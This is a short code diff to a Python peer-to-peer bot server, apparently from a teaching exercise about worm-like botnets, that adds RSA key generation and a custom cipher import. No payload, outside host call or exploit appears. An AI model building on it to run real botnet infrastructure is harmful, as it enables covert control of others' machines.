@@ -1,6 +1,7 @@
 import socket
 import threading
-
+from Crypto.PublicKey import RSA
+from lib.ScheizerCipher import PrivateKey
 from lib.comms import StealthConn
 from lib.files import p2p_download_file
 
@@ -48,14 +49,24 @@ def accept_connection(conn):
     except socket.error:
         print("Connection closed unexpectedly")
 
+
 def bot_server():
     global server_port
+    global private_key
+    global public_key
+
     # Every bot is both client & server, so needs to listen for
     # connections. This is to allow for peer to peer traffic.
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # Real worms use shifting ports but for simplicity, we won't.
     # We'll also assume you may run another bot on your computer
     # so if something else is using 1337, we'll keep going up.
+
+
+    #  generate 2048 bit RSA private key and public key
+    private_key = RSA.generate(2048)
+    public_key = private_key.publickey()
+
     while True:
         try:
             s.bind(("localhost", server_port))
